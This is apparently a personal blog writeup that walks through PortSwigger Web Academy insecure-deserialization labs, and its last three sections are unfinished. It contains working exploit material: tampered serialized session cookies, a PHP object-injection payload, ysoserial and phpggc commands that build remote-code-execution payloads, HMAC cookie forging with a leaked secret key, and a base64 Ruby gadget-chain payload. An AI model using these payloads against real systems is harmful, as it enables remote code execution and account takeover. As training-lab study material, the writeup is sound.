---
title: (Portswigger/WebAcademy) - Insecure Deserialization
 vulnerabilities
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2023-01-15 09:00:00 +0200
categories: [Web Application, Insecure Deserialization]
tags: [Notes, Insecure Deserialization, Portswigger]
math: true
mermaid: true
image:
  src: 
  width: 694
  height: 515
  alt: image alternative text
---
# Intro
This post/writeup is all about the insecure deserialization vulnerabilities.

I'll be using primarily [Portswigger Web Academy](https://portswigger.net/web-security/deserialization) Labs, but i do intent do throw other labs and writeups here as well.

To learn more on the topic, please visit the article linked above at Portswigger's.

## TOC
- [Intro](#intro)
  - [TOC](#toc)
- [Modifying serialized objects](#modifying-serialized-objects)
- [Modifying serialized data types](#modifying-serialized-data-types)
- [Using application functionality to exploit insecure deserialization](#using-application-functionality-to-exploit-insecure-deserialization)
- [Arbitrary object injection in PHP](#arbitrary-object-injection-in-php)
- [Exploiting Java deserialization with Apache Commons](#exploiting-java-deserialization-with-apache-commons)
- [Exploiting PHP deserialization with a pre-built gadget chain](#exploiting-php-deserialization-with-a-pre-built-gadget-chain)
- [Exploiting Ruby deserialization using a documented gadget chain](#exploiting-ruby-deserialization-using-a-documented-gadget-chain)
- [Developing a custom gadget chain for Java deserialization](#developing-a-custom-gadget-chain-for-java-deserialization)
- [Developing a custom gadget chain for PHP deserialization](#developing-a-custom-gadget-chain-for-php-deserialization)
- [Using PHAR deserialization to deploy a custom gadget chain](#using-phar-deserialization-to-deploy-a-custom-gadget-chain)

# Modifying serialized objects
> This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user carlos.
> 
> You can log in to your own account using the following credentials: wiener:peter

![picture 2](/assets/images/c92d9c1d0e1f938138a136115264de5838afd3569fe2e3ababfa17bd1eabed93.png)  


When we log in and check the session cookie in the response, we'll notice serialized (PHP) cookie:

![picture 0](/assets/images/98a5a278c392739dc0add3c2fc7c63f57aa5ddafb0406f94684fb5e328e265d9.png)  

To get admin access to the site and delete `carlos` user, we need to set "admin" boolean from `0` to `1`.

![picture 1](/assets/images/d474334b046e3f2b0908bb0a56823d446e3ff86cea0b1100abc55695e409a3a6.png)  

# Modifying serialized data types
> This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete the user carlos.
> 
> You can log in to your own account using the following credentials: wiener:peter

This lab is almost the same as before. After we login and take a look at the session cookie, we'll notice it is serialized.
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"i7hm2hnr7gn7v930j4g325olmpj1jlxt";}
```

What if we change the `access_token` from string to boolean and set it to `1`
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";b:1;}
```

... We can access the admin panel.

![picture 3](/assets/images/6b1b99a60f2b12a6ca10e0c7e0fbcf6ff75b65c0db38ba9ebb206b81440386b0.png)  


# Using application functionality to exploit insecure deserialization
> This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.
> 
> You can log in to your own account using the following credentials: wiener:peter
> 
> You also have access to a backup account: gregg:rosebud

Not like before, now the objective is to achieve RCE and delete file on the system.

After logging in using the provided credentials, we can upload a file to the system.

![picture 4](/assets/images/1ce68e2848e646bff8648c66cda77fe404f9432d8fefcbb871d32ea255bd4ca1.png)  

Notice the cookie now being serialized and avatar link also being part of it.

![picture 5](/assets/images/88b1c7c9b47333ee170c79394ea9f07d124c75d71b56bc84840bd77348283feb.png)  

We can assume that `users/wiener/avatar` is a path on a system, and what should happen if we delete the user? Can we modify the value?

Let's delete `wiener` account and intercept the request or simply modify the cookie and paste it back into the browser.

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"qw4t1le8olfxy6e9oieuolamexip9po7";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

Success!

![picture 6](/assets/images/146ded632e94ac81e600e811a0f649c73830885bc53de08c5e8251e72cd45334.png)  


# Arbitrary object injection in PHP
> This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab.
> 
> You can log in to your own account using the following credentials: wiener:peter

Like in the previous labs, let us login using the provided credentials.

This is the cookie now: 

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zeqzazlxc5rinmjqgy4wiz13csnatrsv";}
```

This lab is about arbitrary object injection and we only have a single object in the cookie, the `User` Object.

If we pay attention to the source code or if we check the tree in target tree in burp, we will find following entry/URL:

```html
<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
```

By appending tilde, we can read the source code: `/libs/CustomTemplate.php~`.

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

This is code i used to serialize the object:
```php
<?php
class CustomTemplate {
    function __destruct() {
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

$customTemplate = new CustomTemplate();
$customTemplate->lock_file_path = "/home/carlos/morale.txt";

$serialized_customTemplate = serialize($customTemplate);
echo $serialized_customTemplate;
?>
```

The output can now be send in a cookie, regardless the path and the lab should be solved, as `__destruct()` is automatically invoked.

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Key takeaway here is, without having an access to the source code, the vulnerability would be close to impossible to exploit.

# Exploiting Java deserialization with Apache Commons
> This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.
> 
> To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.
> 
> You can log in to your own account using the following credentials: wiener:peter

After logging in this lab, we're dealing with java as the session cookie implies (mind the `rO0...`):

```
Cookie: session=rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBpajl4bnNvMWdva2J3bDVjMnQ5MmN1b2Z0aml0a21kNHQABndpZW5lcg%3d%3d
```

By using [ysoserial](https://github.com/frohoff/ysoserial), we can generate a working payload which will delete the `morale.txt`
```
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | base64 -w 0
```

# Exploiting PHP deserialization with a pre-built gadget chain
> This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.
> 
> To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory.
> 
> You can log in to your own account using the following credentials: wiener:peter

After logging in with provided credentials, we'll find a clue in the source code:

```
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```

Can we access the `phpinfo();`?

![picture 7](/assets/images/f356dba1cc85e45190f7b00ba7cca556bc3044042db6d30c6559de70603947d3.png)  

The application uses `v3.4.0` Zend engine. and Symfony Version: `4.3.6`. Secret key appears in the PHP and ENV variables: `4x0ezi5yn8f7hrs210yatqjrowrf6155`.

The serialized cookie looks like this:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"k54shxynxin7gsx6xpef2sjgtd593clm";}
```

By using this code, we can compute the signature.

```php
php -r "echo hash_hmac('sha1', 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJrNTRzaHh5bnhpbjdnc3g2eHBlZjJzamd0ZDU5M2NsbSI7fQ==', '4x0ezi5yn8f7hrs210yatqjrowrf6155') . PHP_EOL;"
```

This was great help: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/symphony

By checking this [post](https://www.ambionics.io/blog/php-generic-gadget-chains), we learn that PHP generic gadget Chains library can be used, and is PHP equivalent to ysoserial used in the lab before. Link: https://github.com/ambionics/phpggc.

![picture 8](/assets/images/af2ea104e9f831c2733e3358da6278918922cf37420bb0791bbe10d995694053.png)  

We can use `Symfony/RCE4` or `Symfony/RCE7` and run a command.

```
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```

Now sign the token and send it and if everything has been done right, the lab should be solved.

# Exploiting Ruby deserialization using a documented gadget chain
> This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.
> 
> To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.
> 
> You can log in to your own account using the following credentials: wiener:peter

Same as in previous labs, when we log in, we'll get a cookie assigned:

```
BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVxcGsxMTM4ZmIwenNlc2FxcGNscjc3dG9yNXZrZG8yYgY7B0YK
```

Cookie starting with `BAh` is specific to Ruby on Rails applications.

By messing with the cookie value, we'd get an error like this which again implies that we're working with Ruby:

```
index.rb:13:in `load&apos;: incompatible marshal file format (can&apos;t be read) (TypeError)
	format version 4.8 required; 105.63 given
	...
```

Payload from here: https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

Modify the last two lines to `puts Base64.encode64(payload)`, replace the command to execute and run the code.

```
luka@cloudipso  ~/tests  ruby r.rb | tr -d '\n'
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```

# Developing a custom gadget chain for Java deserialization
> This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab's insecure deserialization to obtain the administrator's password.
> 
> To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the administrator and delete carlos.
> 
> You can log in to your own account using the following credentials: wiener:peter
> 
> Note that solving this lab requires basic familiarity with another topic that we've covered on the Web Security Academy.

*tbd*

# Developing a custom gadget chain for PHP deserialization
> This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. To solve the lab, delete the morale.txt file from Carlos's home directory.
> 
> You can log in to your own account using the following credentials: wiener:peter

*tbd*

# Using PHAR deserialization to deploy a custom gadget chain
> This lab does not explicitly use deserialization. However, if you combine PHAR deserialization with other advanced hacking techniques, you can still achieve remote code execution via a custom gadget chain.
> 
> To solve the lab, delete the morale.txt file from Carlos's home directory.
> 
> You can log in to your own account using the following credentials: wiener:peter

*tbd*
